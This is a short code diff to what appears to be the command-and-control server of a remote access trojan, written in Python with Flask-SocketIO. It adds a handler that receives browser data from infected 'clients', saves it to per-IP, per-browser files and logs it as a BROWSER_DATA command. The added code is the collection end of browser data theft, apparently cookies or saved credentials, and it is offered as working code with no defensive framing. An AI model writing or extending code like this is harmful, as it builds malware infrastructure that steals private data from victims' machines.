@@ -228,6 +228,29 @@ def handle_audio(data):
         db.session.commit()
 
 
+@socketio.on('browser_data_response')
+def handle_browser_data(data):
+    sid = request.sid
+    client = Client.query.filter_by(sid=sid).first()
+    if client:
+        browser = data.get('browser')
+        type = data.get('type')
+        data = data.get('data')
+        browser_dir = f"browsers/{client.ip}/{browser}"
+        os.makedirs(browser_dir, exist_ok=True)
+        file_path = f"{browser_dir}/{type}.txt"
+        with open(file_path, 'w', encoding='utf-8') as f:
+            f.write(data)
+        if db.session.query(Command).filter_by(file_path=file_path).count() > 0:
+            return
+        new_command = Command(type=CommandType.BROWSER_DATA,
+                              client_id=client.id,
+                              file_path=file_path,
+                              browser_name=browser)
+        db.session.add(new_command)
+        db.session.commit()
+
+
 @socketio.on('disconnect')
 def handle_disconnect():
     sid = request.sid
